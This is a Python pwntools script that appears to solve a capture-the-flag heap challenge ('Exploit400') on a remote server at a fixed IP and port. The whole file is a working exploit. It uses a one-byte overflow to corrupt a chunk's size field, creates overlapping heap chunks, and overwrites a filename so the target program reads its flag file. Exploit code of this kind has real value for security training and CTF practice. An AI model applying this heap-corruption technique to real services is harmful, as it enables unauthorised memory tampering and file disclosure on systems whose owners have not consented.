from pwn import *

# gcc Exploit400.c
# p = process('../public/a.out')
p = remote('35.184.182.18', 32005)

# a = malloc(24)
p.sendline(b'1')
p.sendline(b'24')
p.sendline(b'A')

# b = malloc(24)
p.sendline(b'1')
p.sendline(b'24')
p.sendline(b'B')

# c = malloc(24) (victim block)
p.sendline(b'3')

# free(a)
p.sendline(b'2')
p.sendline(b'0')

# a = malloc(24) and adjust size metadata of next block
p.sendline(b'1')
p.sendline(b'24')
p.send(b'A' * 25)

# free(b)
p.sendline(b'2')
p.sendline(b'1')

# d = malloc(b) (should have larger size now and overlapping with target)
p.sendline(b'1')
p.sendline(b'56')

# overwrite filename
# target_file = b'Crack400_hint.txt'
target_file = b'Exploit400_flag.txt'
p.sendline(b'C' * (24 + 8) + target_file)

# read filename
p.sendline(b'4')

p.interactive()